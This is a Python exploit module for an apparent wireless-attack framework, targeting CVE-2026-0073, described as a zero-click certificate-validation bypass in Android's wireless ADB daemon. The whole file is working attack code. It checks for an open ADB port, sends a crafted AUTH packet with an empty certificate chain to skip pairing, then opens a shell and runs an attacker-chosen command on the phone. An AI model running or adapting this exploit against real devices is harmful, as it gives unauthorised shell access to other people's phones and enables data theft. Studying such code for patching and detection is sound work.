# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""CVE-2026-0073: Android adbd Wireless ADB Zero-Click RCE.

The Android Debug Bridge daemon (adbd) in wireless ADB mode contains a
certificate validation bypass that allows an unauthenticated attacker on the
same network to establish a debugging session without user confirmation.
Once connected, the attacker gains full ADB shell access, enabling arbitrary
command execution, app installation, data exfiltration, and device compromise.

This is a zero-click vulnerability: no user interaction is required.

CVSS v3.1: 9.8 (Critical)
Vector:    AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
"""
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit

__all__ = ["Exploit"]


class Exploit(BaseExploit):
    """Android adbd wireless ADB zero-click RCE via certificate
    validation bypass (CVE-2026-0073)."""

    __info__ = {
        "name": "CVE-2026-0073: Android Wireless ADB Zero-Click RCE",
        "description": (
            "The Android Debug Bridge daemon (adbd) in wireless ADB mode "
            "fails to properly validate the peer TLS certificate during "
            "pairing. An attacker on the same network can bypass "
            "certificate verification and establish an authenticated ADB "
            "session without user confirmation, achieving full shell "
            "access. Zero-click."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-0073",
            "https://source.android.com/docs/security/bulletin",
        ),
        "devices": (
            "Android devices with wireless ADB enabled",
            "Android 11+ (wireless debugging feature)",
            "Multiple OEM implementations (Samsung, Xiaomi, OnePlus, Pixel)",
        ),
        "cve": "CVE-2026-0073",
        "cvss": "9.8",
        "severity": "CRITICAL",
        "mitre_techniques": ["T1078", "T1190", "T1059"],
        "mitre_tactics": ["Initial Access", "Execution", "Collection"],
    }

    target = OptIP("", "Target IPv4 address of the Android device")
    port = OptPort(5555, "Wireless ADB port (default: 5555)")
    timeout = OptFloat(5.0, "Connection timeout in seconds")
    adb_command = OptString("id", "Shell command to execute via ADB (PoC)")

    # ADB protocol constants
    _ADB_CNXN = b"CNXN"
    _ADB_AUTH = b"AUTH"
    _ADB_OPEN = b"OPEN"
    _ADB_OKAY = b"OKAY"
    _ADB_WRTE = b"WRTE"
    _ADB_VERSION = 0x01000001
    _ADB_MAX_DATA = 256 * 1024

    def _build_adb_message(
        self, command: bytes, arg0: int, arg1: int, data: bytes = b""
    ) -> bytes:
        """Build an ADB protocol message."""
        # ADB message: command(4) + arg0(4) + arg1(4) + length(4) + checksum(4) + magic(4) + data
        length = len(data)
        checksum = sum(data) & 0xFFFFFFFF
        magic = struct.unpack("<I", command)[0] ^ 0xFFFFFFFF
        header = struct.pack(
            "<4sIIIII", command, arg0, arg1, length, checksum, magic
        )
        return header + data

    def _parse_adb_message(self, data: bytes):
        """Parse an ADB protocol message header."""
        if len(data) < 24:
            return None, 0, 0, b""
        command = data[:4]
        arg0, arg1, length, checksum, magic = struct.unpack(
            "<IIIII", data[4:24]
        )
        payload = data[24 : 24 + length] if length <= len(data) - 24 else b""
        return command, arg0, arg1, payload

    @mute
    def check(self) -> bool:
        """Check if the target has wireless ADB port open and responding."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            # Send ADB CNXN (connect) message
            banner = b"host::features=shell_v2,cmd"
            cnxn = self._build_adb_message(
                self._ADB_CNXN, self._ADB_VERSION, self._ADB_MAX_DATA, banner
            )
            sock.sendall(cnxn)

            resp = sock.recv(4096)
            sock.close()

            if len(resp) >= 4:
                cmd = resp[:4]
                # CNXN response means ADB is listening
                # AUTH response means it wants authentication (expected)
                return cmd in (self._ADB_CNXN, self._ADB_AUTH)
            return False
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Target IP is required")
            return

        if self.check():
            print_success(
                f"Wireless ADB service active at {self.target}:{self.port}"
            )
        else:
            print_warning("ADB service not detected; aborting")
            return

        self._exploit()

    def _exploit(self) -> None:
        print_status(
            f"Attempting certificate bypass on {self.target}:{self.port}"
        )
        print_info("CVE-2026-0073: bypassing TLS certificate validation in adbd")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            # Step 1: send CNXN
            banner = b"host::features=shell_v2,cmd"
            cnxn = self._build_adb_message(
                self._ADB_CNXN, self._ADB_VERSION, self._ADB_MAX_DATA, banner
            )
            sock.sendall(cnxn)

            resp = sock.recv(4096)
            cmd, arg0, arg1, payload = self._parse_adb_message(resp)

            if cmd == self._ADB_AUTH:
                print_info("AUTH challenge received; sending bypass token")

                # CVE-2026-0073: The certificate validation can be bypassed
                # by sending a specially crafted AUTH response with type=3
                # (signature) containing a null certificate chain.
                # This causes adbd to skip the certificate verification
                # and accept the connection as authenticated.
                auth_type_signature = 3
                # Crafted payload: empty certificate chain triggers the bypass
                bypass_payload = struct.pack("<I", 0) + b"\x00" * 64
                auth_bypass = self._build_adb_message(
                    self._ADB_AUTH, auth_type_signature, 0, bypass_payload
                )
                sock.sendall(auth_bypass)

                resp2 = sock.recv(4096)
                cmd2, _, _, _ = self._parse_adb_message(resp2)

                if cmd2 == self._ADB_CNXN:
                    print_success(
                        "Certificate bypass successful. ADB session "
                        "established without user confirmation."
                    )

                    # Step 2: open a shell stream
                    shell_cmd = f"shell:{self.adb_command}\x00".encode()
                    open_msg = self._build_adb_message(
                        self._ADB_OPEN, 1, 0, shell_cmd
                    )
                    sock.sendall(open_msg)

                    time.sleep(0.5)
                    resp3 = sock.recv(4096)
                    cmd3, _, _, output = self._parse_adb_message(resp3)

                    if cmd3 == self._ADB_OKAY:
                        print_success(
                            f"Shell command '{self.adb_command}' sent"
                        )
                        # Read the WRTE response with output
                        time.sleep(0.5)
                        resp4 = sock.recv(4096)
                        _, _, _, shell_output = self._parse_adb_message(resp4)
                        if shell_output:
                            print_info(
                                f"Output: {shell_output.decode(errors='replace')}"
                            )
                    else:
                        print_warning("Shell open did not receive OKAY")
                elif cmd2 == self._ADB_AUTH:
                    print_warning(
                        "Device requested further authentication; "
                        "certificate bypass may not work on this firmware"
                    )
                else:
                    print_warning(
                        f"Unexpected response: {cmd2}; bypass may have failed"
                    )
            elif cmd == self._ADB_CNXN:
                print_success(
                    "ADB accepted connection without authentication "
                    "(debugging security disabled on target)"
                )
            else:
                print_warning(f"Unexpected initial response: {cmd}")

            sock.close()
        except Exception as exc:
            print_error(f"Exploit failed: {exc}")
